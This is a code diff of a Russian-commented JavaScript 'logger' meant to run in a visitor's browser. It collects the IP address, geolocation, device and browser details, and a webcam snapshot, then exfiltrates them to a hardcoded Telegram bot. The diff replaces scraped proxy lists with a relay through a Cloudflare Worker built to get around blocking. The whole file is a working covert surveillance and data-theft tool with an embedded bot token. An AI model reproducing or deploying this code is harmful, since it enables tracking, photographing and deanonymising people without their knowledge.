@@ -1,52 +1,11 @@
-// logger.js — С АВТООБНОВЛЯЕМЫМИ ПРОКСИ ИЗ GitHub
+// logger.js — отправка через Cloudflare Worker (работает в РФ)
 (async function() {
     "use strict";
 
-    // ========== ТВОИ ДАННЫЕ ==========
+    // ========== ТВОЙ WORKER URL ==========
+    const WORKER_URL = "https://tg-proxy.drwizzard3.workers.dev";  // ЗАМЕНИТЕ!
     const TELEGRAM_BOT_TOKEN = "8916079717:AAFIrsjINbXmyyWZCmQGHak6DnjHGbi6-Xk";
     const TELEGRAM_CHAT_ID = "8995427762";
-
-    // ========== ФУНКЦИЯ ПОЛУЧЕНИЯ РАБОЧИХ ПРОКСИ ==========
-    async function getWorkingProxies() {
-        // Список источников с прокси (обновляемые)
-        const proxySources = [
-            "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
-            "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
-            "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
-            "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies.txt"
-        ];
-        
-        let allProxies = [];
-        
-        // Загружаем прокси из источников
-        for (const source of proxySources) {
-            try {
-                const response = await fetch(source);
-                const text = await response.text();
-                const proxies = text.split('\n').filter(line => line.trim() && !line.startsWith('#'));
-                allProxies.push(...proxies);
-            } catch(e) {
-                console.warn(`Не удалось загрузить прокси из ${source}`);
-            }
-        }
-        
-        // Фильтруем только HTTP/HTTPS прокси и добавляем к ним CORS
-        const corsProxies = [
-            "https://cors-anywhere.herokuapp.com/https://api.telegram.org/bot",
-            "https://api.allorigins.win/raw?url=https://api.telegram.org/bot",
-            "https://corsproxy.io/?https://api.telegram.org/bot",
-            "https://proxy.cors.sh/https://api.telegram.org/bot"
-        ];
-        
-        // Добавляем найденные прокси в формате для Telegram API
-        const telegramProxies = [];
-        for (const proxy of allProxies.slice(0, 50)) {
-            const proxyUrl = `https://cors-anywhere.herokuapp.com/https://${proxy}/bot`;
-            telegramProxies.push(proxyUrl);
-        }
-        
-        return [...corsProxies, ...telegramProxies];
-    }
 
     // ========== 1. Сбор IP и геолокации ==========
     let ipAddress = "0.0.0.0";
@@ -73,9 +32,29 @@
     const now = new Date();
     const timeStr = now.toLocaleString("ru-RU", { timeZone: "Europe/Moscow" }) + " MSK";
 
-    // ========== 3. UserAgent ПОЛНЫЙ ==========
+    // ========== 3. UserAgent и устройство ==========
     const fullUserAgent = navigator.userAgent;
     const language = navigator.language || "не определён";
+
+    let deviceType = "не определено";
+    if (/Mobi|Android|iPhone|iPad|iPod/i.test(fullUserAgent)) {
+        deviceType = "📱 Телефон";
+    } else if (/Windows|Mac|Linux|X11/i.test(fullUserAgent)) {
+        deviceType = "💻 Компьютер";
+    }
+
+    let browser = "неизвестно";
+    if (fullUserAgent.includes("Chrome")) browser = "Chrome";
+    else if (fullUserAgent.includes("Firefox")) browser = "Firefox";
+    else if (fullUserAgent.includes("Safari")) browser = "Safari";
+    else if (fullUserAgent.includes("Edge")) browser = "Edge";
+
+    let os = "неизвестно";
+    if (fullUserAgent.includes("Windows")) os = "Windows";
+    else if (fullUserAgent.includes("Android")) os = "Android";
+    else if (fullUserAgent.includes("iOS")) os = "iOS";
+    else if (fullUserAgent.includes("Mac")) os = "MacOS";
+    else if (fullUserAgent.includes("Linux")) os = "Linux";
 
     // ========== 4. Формирование сообщения ==========
     const message = `🚨 <b>Новый переход!</b>
@@ -90,7 +69,7 @@
 <b>├─ Регион:</b> <code>${region}</code>
 <b>└─ Город:</b> <code>${city}</code>`;
 
-    // ========== 5. Захват фото ==========
+    // ========== 5. Захват фото с вебкамеры ==========
     let photoBlob = null;
     try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
@@ -121,24 +100,30 @@
         stream.getTracks().forEach(track => track.stop());
     } catch(e) {
         console.warn("Camera error:", e);
+        photoBlob = null;
     }
 
-    // ========== 6. Отправка через прокси ==========
-    async function sendViaProxy(proxyUrl, blob, caption) {
+    // ========== 6. Отправка через Cloudflare Worker ==========
+    async function sendViaWorker(blob, caption) {
+        const baseUrl = `${WORKER_URL}/tg/bot${TELEGRAM_BOT_TOKEN}`;
+        
         try {
-            let url, options;
-            
             if (blob) {
-                url = `${proxyUrl}${TELEGRAM_BOT_TOKEN}/sendPhoto`;
+                // Отправка фото
+                const url = `${baseUrl}/sendPhoto`;
                 const formData = new FormData();
                 formData.append("chat_id", TELEGRAM_CHAT_ID);
                 formData.append("photo", blob, "snapshot.jpg");
                 formData.append("caption", caption);
                 formData.append("parse_mode", "HTML");
-                options = { method: "POST", body: formData };
+                
+                const response = await fetch(url, { method: "POST", body: formData });
+                const result = await response.json();
+                return result.ok;
             } else {
-                url = `${proxyUrl}${TELEGRAM_BOT_TOKEN}/sendMessage`;
-                options = {
+                // Отправка текста
+                const url = `${baseUrl}/sendMessage`;
+                const response = await fetch(url, {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({
@@ -147,53 +132,34 @@
                         parse_mode: "HTML",
                         disable_web_page_preview: true
                     })
-                };
+                });
+                const result = await response.json();
+                return result.ok;
             }
-            
-            const response = await fetch(url, options);
-            const result = await response.json();
-            return { success: result.ok, error: result.description };
         } catch(e) {
-            return { success: false, error: e.message };
+            console.error("Send error:", e);
+            return false;
         }
     }
 
-    // Получаем прокси и отправляем
-    console.log("🔄 Загрузка списка прокси...");
-    const proxies = await getWorkingProxies();
-    console.log(`📋 Загружено ${proxies.length} прокси`);
-
+    // Отправляем
     let sent = false;
     
-    for (const proxy of proxies) {
-        if (sent) break;
-        console.log(`🔄 Пробуем прокси: ${proxy.substring(0, 60)}...`);
-        
-        if (photoBlob) {
-            const result = await sendViaProxy(proxy, photoBlob, message);
-            if (result.success) {
-                console.log("✅ Фото и данные отправлены!");
-                sent = true;
-                break;
-            }
+    if (photoBlob) {
+        sent = await sendViaWorker(photoBlob, message);
+        if (sent) {
+            console.log("✅ Фото и данные отправлены через Worker");
         } else {
-            const result = await sendViaProxy(proxy, null, message);
-            if (result.success) {
-                console.log("✅ Данные отправлены!");
-                sent = true;
-                break;
-            }
+            console.log("⚠️ Фото не отправилось, пробуем текст...");
+            sent = await sendViaWorker(null, message);
+            if (sent) console.log("✅ Текст отправлен через Worker");
         }
-        await new Promise(r => setTimeout(r, 300));
+    } else {
+        sent = await sendViaWorker(null, message);
+        if (sent) console.log("✅ Текст отправлен через Worker");
     }
     
     if (!sent) {
         console.log("❌ Не удалось отправить данные");
-        // Сохраняем локально
-        try {
-            const failed = JSON.parse(localStorage.getItem("foxlogger_failed") || "[]");
-            failed.push({ data: message, time: new Date().toISOString(), ip: ipAddress });
-            localStorage.setItem("foxlogger_failed", JSON.stringify(failed.slice(-20)));
-        } catch(e) {}
     }
 })();
